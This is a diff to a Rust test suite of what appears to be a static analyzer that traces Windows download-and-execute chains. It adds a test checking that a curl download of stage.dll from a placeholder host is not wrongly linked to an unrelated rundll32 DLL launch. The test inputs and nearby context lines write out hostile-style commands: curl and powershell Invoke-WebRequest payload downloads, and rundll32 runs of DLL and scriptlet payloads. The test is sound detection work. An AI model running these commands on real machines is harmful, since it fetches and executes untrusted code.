@@ -13228,6 +13228,28 @@ rundll32.exe scrobj.dll,GenerateTypeLib payload.sct"#,
     }
 
     #[test]
+    fn rundll32_current_dir_nested_dll_does_not_use_unrelated_basename_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o D:\Other\stage.dll https://rundll32-current-dir-wrong-basename.example/stage.dll"#,
+            &mut env,
+        );
+        interpret_line(r"rundll32 .\Temp\stage.dll,EntryPoint", &mut env);
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Rundll32 { cmd, url: Some(url) }
+                        if cmd == r"rundll32 .\Temp\stage.dll,EntryPoint"
+                            && url == "https://rundll32-current-dir-wrong-basename.example/stage.dll"
+                )
+            }),
+            "rundll32 current-dir nested DLL reused unrelated basename download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn rundll32_resolves_late_powershell_download_destination() {
         let report = crate::analyze(
             br#"powershell invoke-webrequest -uri http://rundll32-late.example/images/62.gif -outfile c:\programdata\COIm.jpg
